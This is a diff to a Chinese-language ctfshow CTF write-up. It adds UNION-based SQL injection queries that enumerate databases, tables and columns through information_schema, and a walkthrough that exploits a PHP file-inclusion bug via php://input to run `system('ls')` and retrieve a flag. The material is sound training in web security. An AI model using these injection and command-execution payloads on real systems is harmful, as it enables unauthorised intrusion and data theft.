@@ -197,6 +197,44 @@ ps：两个数据之间用”&“连接
 
 5.最后获取flag，输入语句admin' or 1=1 union select 1,(select flag from flag limit 0,1 ),3 # （limit目的为获取第一行的值）获得结果“欢迎你，ctfshow欢迎你，ctfshow{b2faa05a-c4cc-4a5f-a58f-9391ebb19afa}”
 
+**SQL注入查询顺序**：库名（schema_name）——表名(table_name)——字段名(column_name)
+
+- 库名
+
+```
+SELECT * FROM users WHERE username='-1' or '1'='1' union SELECT 1,schema_name,2 FROM information_schema.schemata;-- ' AND password='$password';
+```
+
+- 表名
+
+```
+SELECT * FROM users WHERE username='-1' or '1'='1' union select 1,group_concat(table_name),2 from information_schema.tables where table_schema=database()-- ' AND password='$password';
+```
+
+- 字段名
+
+```
+SELECT * FROM users WHERE username='-1' or '1'='1' union select 1,group_concat(column_name),2 from information_schema.columns where table_schema=database()-- ' AND password='$password';
+```
+
+
+
+##### web3
+
+进入题目链接，观察到页面展示了部分源码，为PHP语言，查询得知其中include函数涉及**文件包含漏洞**。
+
+确认该题为PHP文件包含漏洞后，通过了解可使用代理抓包软件Burpsuit去抓包,并且使用**PHP伪协议**中的`php://input`来在包的最下面写上`<?php system('ls')?>`执行系统命令查看当前目录的文件，来查看有无目标文件。
+
+打开bp代理，对该网页进行拦截抓包，在GET请求的url中拼接伪协议`php://input`,将该数据包内容后加入`<?php system('ls')?>`（前面要有一行空行），然后进行放包操作。
+
+观察到放包后页面出现`ctf_go_go_go index.php`字段，ctf_go_go_go文件应该就是藏匿flag的文件。
+
+接着直接在url地址栏中输入url参数,访问ctf_go_go_go文件,得到flag。
+
+
+
+
+
 
 
 
